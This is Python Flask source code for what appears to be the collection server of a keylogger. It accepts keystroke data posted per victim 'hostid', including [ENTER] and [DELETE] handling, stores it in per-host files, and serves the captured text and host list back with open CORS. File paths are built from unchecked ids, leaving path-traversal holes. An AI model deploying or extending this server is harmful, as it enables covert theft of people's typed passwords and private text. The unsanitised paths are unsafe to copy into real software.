import json, os
from flask import Flask, jsonify
from flask import request
from flask import render_template

app = Flask(__name__)

def check_id(id):
    for x in range(len(hostid_list)):
        if hostid_list[x] == id:
            return False
    return True

@app.route('/page')
def index():
    return render_template("index.html")

@app.route('/data/<id>', methods=['GET'])
def data(id):
    filename = "data/data_"+id+".txt"

    with open(filename, 'r') as file:
        data = file.read().rstrip()

    print(id)

    response = jsonify({"data":data})
    response.headers.add('Access-Control-Allow-Origin', '*')    
    return response
@app.route('/clear/<id>', methods=["GET"])
def clear(id):
    filename = "data/data_"+id+".txt"
    with open(filename, "a") as file:
        file.truncate(0)
    return json.dumps({'response':'success'})

@app.route("/get_id_list", methods=["GET"])
def get_id_list():
    response = jsonify(hostid_list)
    response.headers.add('Access-Control-Allow-Origin', '*')
    return response

@app.route('/set', methods=['POST'])
def set():
    content = request.get_json()
    isback = False
    filename = "data/data_"+content["hostid"]+".txt"
    with open(filename, 'a') as file:
        if(content["data"] == " [ENTER] "):
            file.write("\n")
        if(content["data"] == " [DELETE] "):
            isback = True
        else:
            file.write(content["data"])
    if isback:
        with open(filename, 'ab') as file:
            if os.path.getsize(filename) != 0:
                file.seek(-1, os.SEEK_END)
                file.truncate()
    
    if check_id(content["hostid"]):
        hostid_list.append(content["hostid"])
        print("new id ["+content["hostid"]+"] added!")
    
    return json.dumps({'response':'success'})

hostid_list = []

app.run(host='0.0.0.0', ssl_context='adhoc')
